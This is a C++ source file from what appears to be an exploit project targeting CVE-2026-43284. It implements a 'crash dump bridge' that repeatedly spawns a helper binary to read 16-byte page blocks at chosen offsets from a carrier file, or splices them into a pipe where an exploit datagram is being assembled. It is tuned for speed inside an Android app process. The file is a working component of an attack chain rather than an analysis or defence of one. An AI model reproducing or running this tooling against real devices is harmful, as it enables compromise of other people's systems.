/** @file backend/cve_2026_43284/landing/crash_dump_bridge.cpp
 *  The exec, and the two ways its output is used.
 */
#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
#include "support/gl_log.h"

#include <cerrno>
#include <cstdio>
#include <cstring>
#include <ctime>

#include <spawn.h>
#include <sys/wait.h>
#include <unistd.h>

#if defined(__linux__)
#include <sched.h>
#include <sys/mman.h>
#endif

#if !defined(__ANDROID__)
/** 宿主侧 <unistd.h> 不声明 environ（目标侧 NDK 的头已声明），posix_spawn 需要它当 envp。 */
extern char **environ;
#endif

namespace ghostlock::backend::cve_2026_43284::landing {
    namespace {
        /** Copy a path in, or refuse: these strings become argv, and a truncated argv is a
         *  different command. */
        bool take_path(char *out, std::size_t capacity, const char *path,
                       std::size_t length) noexcept {
            if (path == nullptr || length == 0U || length + 1U > capacity) {
                return false;
            }
            for (std::size_t i = 0U; i < length; ++i) {
                const char c = path[i];
                if (c == '\0' || c == ' ' || c == '\t' || c == '\n' || c == '\r') {
                    return false;
                }
            }
            std::memcpy(out, path, length);
            out[length] = '\0';
            return true;
        }

#if defined(__linux__)
        /** vfork 形态的 spawn 参数：与 posix_spawn 唯一的差别是**不走 bionic 的 fork 回落**。
         *  app 进程有约 17 GB VMS，fork 要复制页表（真机 10–30 ms/次）；clone(CLONE_VM|CLONE_VFORK)
         *  与调用方共享地址空间直到 exec，成本落回地板（本机静态子进程实测 ~2 ms）。 */
        struct VforkSpawn final {
            int sink = -1;
            int close0 = -1;
            int close1 = -1;
            const char *path = nullptr;
            char *const *argv = nullptr;
        };

        /** 子进程侧：只做 dup2/close/execve/_exit（vfork 只允许这类异步信号安全调用）。 */
        int vfork_child(void *raw) noexcept {
            auto *const spawn = static_cast<VforkSpawn *>(raw);
            if (::dup2(spawn->sink, STDOUT_FILENO) < 0) {
                ::_exit(127);
            }
            (void) ::close(spawn->close0);
            if (spawn->close1 >= 0) {
                (void) ::close(spawn->close1);
            }
            ::execve(spawn->path, spawn->argv, environ);
            ::_exit(127);
        }
#endif

        /**
         *  起一个 helper 进程。成功返回 pid，失败返回 -1。
         *
         *  @note Linux 上走 vfork 形态；宿主（macOS）没有 clone(2)，仍走 posix_spawn，测试语义不变。
         */
        pid_t spawn_helper(const char *path, char *const argv[], int sink, int close0,
                           int close1) noexcept {
#if defined(__linux__)
            constexpr std::size_t kStackBytes = 64U * 1024U;
            void *const stack = ::mmap(nullptr, kStackBytes, PROT_READ | PROT_WRITE,
                                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (stack == MAP_FAILED) {
                return -1;
            }
            VforkSpawn spawn{};
            spawn.sink = sink;
            spawn.close0 = close0;
            spawn.close1 = close1;
            spawn.path = path;
            spawn.argv = argv;
            auto *const top = static_cast<char *>(stack) + kStackBytes;
            const pid_t pid = ::clone(vfork_child, top, CLONE_VM | CLONE_VFORK | SIGCHLD, &spawn);
            (void) ::munmap(stack, kStackBytes);  /* vfork：返回时子进程已 exec 或已退出 */
            return pid;
#else
            posix_spawn_file_actions_t actions;
            if (::posix_spawn_file_actions_init(&actions) != 0) {
                return -1;
            }
            (void) ::posix_spawn_file_actions_adddup2(&actions, sink, STDOUT_FILENO);
            (void) ::posix_spawn_file_actions_addclose(&actions, close0);
            if (close1 >= 0) {
                (void) ::posix_spawn_file_actions_addclose(&actions, close1);
            }
            pid_t pid = -1;
            const int rc = ::posix_spawn(&pid, path, &actions, nullptr, argv, environ);
            (void) ::posix_spawn_file_actions_destroy(&actions);
            return rc == 0 ? pid : -1;
#endif
        }
    }  // namespace

    bool CrashDumpBridge::bind(const char *helper_path, std::size_t helper_bytes,
                               const char *carrier_path, std::size_t carrier_bytes,
                               int bridge_mode) noexcept {
        bound_ = take_path(helper_, sizeof(helper_), helper_path, helper_bytes) &&
                 take_path(carrier_, sizeof(carrier_), carrier_path, carrier_bytes);
        if (!bound_) {
            outcome_ = Outcome::NotBound;
            return false;
        }
        /* 形态在这里定下，且只有两个取值：不是 1 就是 0，装配层写错数字不会变成第三种行为。 */
        mode_ = bridge_mode == kBridgeModeSession ? kBridgeModeSession : kBridgeModeSpawn;
        if (mode_ == kBridgeModeSession) {
            /* 会话把同一对路径交下去（规则与一次性桥完全相同）；子进程到第一次请求才起。 */
            if (!session_.bind(helper_, helper_bytes, carrier_, carrier_bytes)) {
                bound_ = false;
                outcome_ = Outcome::NotBound;
                return false;
            }
            debug("bridge: bound helper=%s carrier=%s mode=session", helper_, carrier_);
        }
        return true;
    }

    bool CrashDumpBridge::session_ready() noexcept {
        if (!session_attempted_) {
            session_attempted_ = true;
            session_started_ = session_.open();
            debug("bridge: session start=%d pid=%d mode=%d", session_started_ ? 1 : 0,
                    static_cast<int>(session_.pid()), mode_);
        }
        return session_started_;
    }

    long CrashDumpBridge::session_read16(std::uint64_t offset, std::uint8_t *out) noexcept {
        if (!session_ready()) {
            outcome_ = Outcome::HelperFailed;
            return -1;
        }
        const long got = session_.read16(offset, out);
        if (got != static_cast<long>(kBlockBytes)) {
            /* 一次失败就是这一块失败，之后所有块也失败（会话自己锁死，见 BridgeSession::dead）；
             * 失败的出口当场把管道关掉、把子进程收掉，不留到对象析构才关。 */
            outcome_ = Outcome::HelperFailed;
            last_status_ = session_.last_status();
            error("bridge: session read refused offset=%llu outcome=%d requests=%zu",
                    static_cast<unsigned long long>(offset), static_cast<int>(session_.last_outcome()),
                    session_.requests());
            session_.close();
            session_started_ = false;
            return -1;
        }
        outcome_ = Outcome::Ok;
        return got;
    }

    long CrashDumpBridge::session_splice16(int pipe_write_fd, std::uint64_t offset) noexcept {
        if (!session_ready()) {
            outcome_ = Outcome::HelperFailed;
            return -1;
        }
        const long spliced = session_.splice16_into_pipe(offset, pipe_write_fd);
        if (spliced != static_cast<long>(kBlockBytes)) {
            outcome_ = Outcome::HelperFailed;
            last_status_ = session_.last_status();
            error("bridge: session splice refused offset=%llu outcome=%d requests=%zu",
                    static_cast<unsigned long long>(offset), static_cast<int>(session_.last_outcome()),
                    session_.requests());
            session_.close();
            session_started_ = false;
            return -1;
        }
        outcome_ = Outcome::Ok;
        return spliced;
    }

    void CrashDumpBridge::close_session() noexcept {
        /* 先关再用：此后 session_ready() 恒假，所以关闭之后不会有第二个子进程冒出来。 */
        session_attempted_ = true;
        session_started_ = false;
        session_.close();
    }

    long CrashDumpBridge::read16(void *ctx, std::uint64_t offset,
                                 std::uint8_t out[kBlockBytes]) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        /* 读的入口（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:129-167
         *  —— 那边 real_bridge_read16 用一个自己的管道接 helper 的 stdout，读满 16 字节才算成）。 */
        verbose("bridge: read16 offset=%llu len=%zu out=%d ctx=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, out != nullptr ? 1 : 0,
                ctx != nullptr ? 1 : 0);
        if (self == nullptr) {
            return -1;
        }
        /* 会话形态：同一对路径，但子进程只起一次，之后每块是一次 IPC（bridge_session.hpp）。 */
        if (self->mode_ == kBridgeModeSession) {
            return self->session_read16(offset, out);
        }
        /* A pipe of our own: the helper's stdout comes here and this side reads the block. */
        return self->run(offset, -1, out);
    }

    long CrashDumpBridge::splice16(void *ctx, int pipe_write_fd, std::uint64_t offset) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        /* 写的入口：来源 fd 就是调用方那条管道（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:169-181
         *  —— 那边 real_bridge_splice16_into_pipe 把页直接切进调用方的管道，helper 退出码 0 等于整块）。 */
        verbose("bridge: splice16 offset=%llu len=%zu pipe_write_fd=%d ctx=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, pipe_write_fd, ctx != nullptr ? 1 : 0);
        if (self == nullptr) {
            return -1;
        }
        if (self->mode_ == kBridgeModeSession) {
            return self->session_splice16(pipe_write_fd, offset);
        }
        /* The caller's pipe is the helper's stdout: whatever the helper writes lands where the
         * datagram is being assembled, so no block travels through this process at all. */
        return self->run(offset, pipe_write_fd, nullptr);
    }

    long CrashDumpBridge::run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept {
        if (!bound_) {
            outcome_ = Outcome::NotBound;
            return -1;
        }
        int fds[2] = {-1, -1};
        if (::pipe(fds) != 0) {
            outcome_ = Outcome::PipeFailed;
            return -1;
        }
        /* 每次 exec 的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:80-124
         *  —— 那边 exec_crash_dump 以 {offset, path} 起 helper，并把 stdout 交给管道；
         *  :129-167 从管道读回；:173-181 把管道当写来源）。 */
        verbose("bridge: run offset=%llu sink_stdout=%d out=%d pipe=[%d,%d] helper=%s carrier=%s",
                static_cast<unsigned long long>(offset), sink_stdout, out != nullptr ? 1 : 0,
                fds[0], fds[1], helper_, carrier_);
        char offset_text[32] = {};
        (void) std::snprintf(offset_text, sizeof(offset_text), "%llu",
                             static_cast<unsigned long long>(offset));
        /* 机械改动（2026-10-17，速度）：fork()+execl() -> posix_spawn()。exec 的目标、argv、
         *  管道与退出码判定一字未改；换掉的只有「复制父进程地址空间」这一步：bionic 的
         *  posix_spawn 走 clone(CLONE_VM|CLONE_VFORK)，子进程与调用方共享页表直到 exec，
         *  所以每次 helper 调用不再按调用方的 VmSize 付钱（真机实测：app 进程内 fork
         *  21 ms/次 -> 换后预期 0.3-1 ms/次）。 */
        const int sink = sink_stdout >= 0 ? sink_stdout : fds[1];
        /* 一次性诊断（2026-10-17）：把 spawn 与 wait 两段分开计时，真机上定位每次调用的钱花在哪。 */
        timespec t_spawn0{};
        (void) ::clock_gettime(CLOCK_MONOTONIC, &t_spawn0);
        /* The retired chain's call, verbatim: argv[0] is the name the helper expects and the
         *  two arguments are {offset, path}. A third argument, or the full path as argv[0], makes
         *  the helper read nothing -- measured on the device. */
        char *const child_argv[] = {const_cast<char *>("crashdump64"), offset_text, carrier_,
                                    nullptr};
        /* 机械改动（2026-10-17，速度）：posix_spawn(file_actions) → spawn_helper()（Linux 上是
         *  clone(CLONE_VM|CLONE_VFORK)）。argv、管道重定向、退出码判定一字未改。 */
        const pid_t child = spawn_helper(helper_, child_argv, sink, fds[0], fds[1]);
        timespec t_spawn1{};
        (void) ::clock_gettime(CLOCK_MONOTONIC, &t_spawn1);
        if (child < 0) {
            (void) ::close(fds[0]);
            (void) ::close(fds[1]);
            outcome_ = Outcome::SpawnFailed;
            error("bridge: spawn refused offset=%llu helper=%s", static_cast<unsigned long long>(offset),
                    helper_);
            return -1;
        }
        verbose("bridge: spawn pid=%ld read_fd=%d write_fd=%d", static_cast<long>(child), fds[0],
                fds[1]);
        /* In the parent: only the end that carries the block stays open. */
        (void) ::close(fds[1]);
        long got = (sink_stdout >= 0) ? static_cast<long>(kBlockBytes) : 0;
        if (sink_stdout < 0) {
            got = 0;
            while (got < static_cast<long>(kBlockBytes)) {
                const ssize_t n =
                    ::read(fds[0], out + got, kBlockBytes - static_cast<std::size_t>(got));
                if (n < 0) {
                    if (errno == EINTR) {
                        continue;
                    }
                    got = -errno;
                    break;
                }
                if (n == 0) {
                    break;
                }
                got += static_cast<long>(n);
            }
        }
        /* 回读结果（成功历史：同 crash_dump.cpp:143-158 —— 那边只有读满 kCrashDumpBlockBytes 才继续）。 */
        verbose("bridge: read got=%ld want=%zu out=%d head=%02x%02x%02x%02x",
                got, kBlockBytes, out != nullptr ? 1 : 0,
                (out != nullptr) ? static_cast<unsigned>(out[0]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[1]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[2]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[3]) : 0U);
        (void) ::close(fds[0]);
        int status = 0;
        for (;;) {
            const pid_t reaped = ::waitpid(child, &status, 0);
            if (reaped == child) {
                break;
            }
            if (reaped < 0 && errno != EINTR) {
                last_status_ = -1;
                outcome_ = Outcome::SpawnFailed;
                return -1;
            }
        }
        last_status_ = status;
        timespec t_wait1{};
        (void) ::clock_gettime(CLOCK_MONOTONIC, &t_wait1);
        const auto since_us = [](const timespec &a, const timespec &b) -> long long {
            return static_cast<long long>(b.tv_sec - a.tv_sec) * 1000000LL +
                   (static_cast<long long>(b.tv_nsec) - static_cast<long long>(a.tv_nsec)) / 1000LL;
        };
        /* helper 的退出码（成功历史：同 crash_dump.cpp:123 —— 那边 (WIFEXITED && WEXITSTATUS == 0) 才算成）。 */
        verbose("bridge: helper status=0x%x exited=%d code=%d spawn_us=%lld wait_us=%lld",
                static_cast<unsigned>(status), WIFEXITED(status) ? 1 : 0,
                WIFEXITED(status) ? WEXITSTATUS(status) : -1, since_us(t_spawn0, t_spawn1),
                since_us(t_spawn1, t_wait1));
        /* The helper's own convention, kept from the retired chain: exit code zero means it moved
         * the whole block. A helper that wrote sixteen bytes and then failed is still a failure,
         * because nothing says the bytes it wrote are the page. */
        const bool clean = WIFEXITED(status) && WEXITSTATUS(status) == 0;
        /* The helper's verdict comes first: a helper that failed is a failed helper even when it
         * also wrote short, and the two are different faults to act on. */
        if (!clean) {
            error("bridge: refused helper-failed status=0x%x offset=%llu",
                    static_cast<unsigned>(status), static_cast<unsigned long long>(offset));
            outcome_ = Outcome::HelperFailed;
            return -1;
        }
        if (sink_stdout < 0 && got != static_cast<long>(kBlockBytes)) {
            error("bridge: refused short-read got=%ld want=%zu offset=%llu",
                    got, kBlockBytes, static_cast<unsigned long long>(offset));
            outcome_ = Outcome::ShortRead;
            return got < 0 ? got : -1;
        }
        outcome_ = Outcome::Ok;
        verbose("bridge: ok offset=%llu bytes=%zu sink_stdout=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, sink_stdout);
        return static_cast<long>(kBlockBytes);
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
